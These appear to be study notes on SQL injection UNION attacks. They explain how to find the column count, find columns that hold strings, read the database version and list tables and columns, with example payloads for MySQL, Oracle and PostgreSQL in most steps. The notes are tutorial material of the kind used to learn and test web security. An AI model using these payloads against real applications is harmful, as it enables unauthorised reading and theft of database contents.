## SQLi UNION attacks
For this attack to work:

- The individual queries must return the same number of columns
- The data types in each column must match between the individual queries.

### Steps to carrying out UNION attacks

1. **Determining the number of columns required**

There are two methods to determining the number of columns that are being returned by the original query

- Method 1: Using `ORDER BY`

`' ORDER BY 1` is supplied and the value keeps increasing to get the actual number of columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error.

- Method 2: Using `UNION SELECT`

_For MySQL databases_

`' UNION SELECT NULL--`
`' UNION SELECT NULL, NuLL--`

_For Oracle databases_

`' UNION SELECT NULL FROM DUAL--`; dual is an inbuilt table in oracle DB's

The instance of NULL supplied keeps increasing unti the right amount is achieved as as usual If the number of nulls does not match the number of columns, the database returns an error.

_NB:_ Method 2 is preferred because NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

2. **Finding Columns with a useful data type**

After determining the number of columns required, each column can then be probed to test whether it can hold string data; since the content we're interested in retrieving is of string data type. 

This can be done by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn.

_Example:_ If the number of columns determined is four

`' UNION SELECT 'a', NULL, NULL, NULL--`

If the column data type is not compatible with string data, the injected query will cause a database error.

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

3. **Retrieving Interesting data**

Once we determine the column that can hold string data then we can retrieve contents of the table; having known the columns that exists in it.

_Syntax:_ `' UNION SELECT column1, column2 FROM table_name--`

We can also retrieve multiple data in one column by concatenating and adding a separator (different for each database language). e.g `CONCAT(column1,'-',column2)` for MySQL databases

_NB:_ There's need to examine database structure to determine the column names before retrieving data

- Querying database type and version
MySQL, Microsoft - `' UNION SELECT @@version,NULL-- ` (If the server returns error, use `#` as comment)
Oracle - `' UNION SELECT BANNER,NULL FROM v$version-- `
PostgreSQL - `' UNION SELECT version()`

- Listing contents of the database: All other databases uses the same format for listing except oracle
Non-Oracle - `' UNION SELECT * FROM information_schema.tables` (lists all the tables in the db)
             `' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'table1'` (list the columns in our table of interest, after which we can retrieve the data in them)

_Example:_

`' UNION SELECT table_name,null FROM information_schema.tables` (lists the table names in schema only after determining valid columns to be 2)

`' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = table1` (lists the column names in schema only after determining valid columns to be 2)

Oracle - `' UNION SELECT * FROM all_tables` (lists all the tables)
         `' UNION SELECT * FROM all_tab_columns WHERE table_name = 'table1'` (lists the columns in a desired table)

_NB:_ Firstly determine the amount of columns present

